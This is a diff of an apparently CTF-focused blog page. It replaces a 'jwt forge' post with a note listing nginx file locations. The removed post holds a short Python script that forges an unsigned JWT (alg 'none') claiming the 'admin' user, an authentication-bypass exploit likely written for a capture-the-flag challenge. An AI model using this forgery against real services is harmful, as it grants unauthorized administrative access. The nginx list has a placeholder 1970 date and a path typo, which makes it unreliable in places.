@@ -3,7 +3,7 @@
   <head>
      
     <meta charset="UTF-8">
-    <title>jwt forge - d0ud</title>
+    <title>web directory - d0ud</title>
     <link rel="shortcut icon" href="/static/img/icon.png">
     <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
     
@@ -15,7 +15,7 @@
 
     <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
     <meta property="og:site_name" content="d0ud">
-    <meta property="og:title" content="jwt forge"/>
+    <meta property="og:title" content="web directory"/>
     
     <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
     
@@ -52,44 +52,42 @@
     <main>
     <div class="wrap min">
         <section class="post-title">
-            <h2>jwt forge</h2>
+            <h2>web directory</h2>
             <div class="post-meta">
-                <time class="date">2022.04.13</time>
+                <time class="date">1970.01.01</time>
             
-                <span class="category"><a class="category-link" href="/categories/authentication/">authentication</a></span>
+                <span class="category"><a class="category-link" href="/categories/record/">record</a></span>
             
             </div>
         </section>
         <article class="post-content">
         
-            <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-a <span class="token operator">=</span> <span class="token string">'&#123;"alg":"none","typ":"JWT"&#125;'</span>
-b<span class="token operator">=</span> <span class="token string">'&#123;"secretid":[],"username":"admin","password":"a","iat":1649828192&#125;'</span>
-
-c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">try</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-        c<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
-<span class="token keyword">except</span><span class="token punctuation">:</span>
-    <span class="token keyword">pass</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+            <blockquote>这篇文章上次修改于 19107 天前，可能其部分内容已经发生变化，如有疑问可询问作者。</blockquote>
+        
+            <p><code>nginx</code>网站目录</p>
+<pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx
+主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf
+管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service
+模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules
+应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx
+程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html
+日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx
+配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
         </article>
         <section class="post-near">
             <ul>
                 
-                    <li>上一篇: <a href="/%5BMRCTF2020%5DPYWebsite/">&lt;MRCTF2020&gt;PYWebsite</a></li>
+                    <li>上一篇: <a href="/%5BNPUCTF2020%5DReadlezPHP/">&lt;NPUCTF2020&gt;ReadlezPHP</a></li>
                 
                 
-                    <li>下一篇: <a href="/%5BHFCTF2020%5DEasyLogin/">&lt;HFCTF2020&gt;EasyLogin</a></li>
+                    <li>下一篇: 看完啦 (つд⊂)</li>
                 
             </ul>
         </section>
         
             <section class="post-tags">
-            <a class="-none-link" href="/tags/script/" rel="tag">script</a>
+            <a class="-none-link" href="/tags/basic/" rel="tag">basic</a>
             </section>
         
     
